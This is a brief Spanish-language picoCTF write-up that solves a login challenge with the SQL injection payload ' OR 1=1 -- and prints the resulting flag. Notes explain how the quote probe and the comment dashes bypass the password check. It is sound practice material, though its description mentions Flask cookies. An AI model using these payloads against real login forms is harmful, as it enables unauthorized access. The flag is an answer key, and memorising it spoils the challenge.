## Descripción

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:50886/
## Solución

**Solución 1
```
En el campo de **username**, escribe: `' OR 1=1 --`
# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}

```

#### NOTAS
- **Prueba de error:** En el campo de usuario, escribe una sola comilla: `'`. Si al intentar entrar recibes un error interno o un mensaje de error de SQL, confirmas que es vulnerable.
- Al introducir ese texto, la consulta SQL se transforma en algo como esto: `SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...';`

- **`OR 1=1`**: Como 1 siempre es igual a 1, la base de datos devuelve "verdadero" para toda la fila.
    
- **`--`**: Estos guiones (en SQL de tipo SQLite o MySQL) sirven para **comentar** el resto de la línea. Esto hace que la parte donde se verifica la contraseña sea ignorada por el servidor.